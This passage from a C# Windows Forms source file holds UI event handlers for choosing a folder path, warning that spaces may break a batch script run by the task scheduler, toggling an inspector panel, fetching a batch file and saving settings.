                    MessageBox.Show("Failed to load the batch file.", "Fail");
                }
            }
        }

        private void searchhidepathbutton_Click(object sender, EventArgs e)
        {
            using (var file = new FolderBrowserDialog())
            {
                DialogResult result = file.ShowDialog();

                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(file.SelectedPath))
                {
                    if (file.SelectedPath.Contains(" "))
                    {
                        MessageBox.Show("Path(s) with spaces on them might break the batch script,\ntask scheduler might not be able to execute your file.\n\nYour path will still be set, but recurring will most likely NOT work.", "Hold on");
                        hidepathtextbox.Text = file.SelectedPath;
                    }
                    else
                    {
                        hidepathtextbox.Text = file.SelectedPath;
                    }
                }
            }
        }

        bool iii = false;
        private void inspectorbutton_Click(object sender, EventArgs e)
        {
            if (iii)
            {
                iii = false;
                this.Size = new Size(500, 761);
                inspectorbutton.Text = ">";

            }
            else
            {
                iii = true;
                this.Size = new Size(1232, 761);
                inspectorbutton.Text = "<";
            }
        }

        private void exitbutton_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void fetchbutton_Click(object sender, EventArgs e)
        {
            fetchbatch();
        }

        private void minimizebutton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            saveProperties();
        }

        private void CertLayerPicker_ValueChanged(object sender, EventArgs e)
        {
            certlayers = Convert.ToInt32(CertLayerPicker.Value);
        }
    }
}
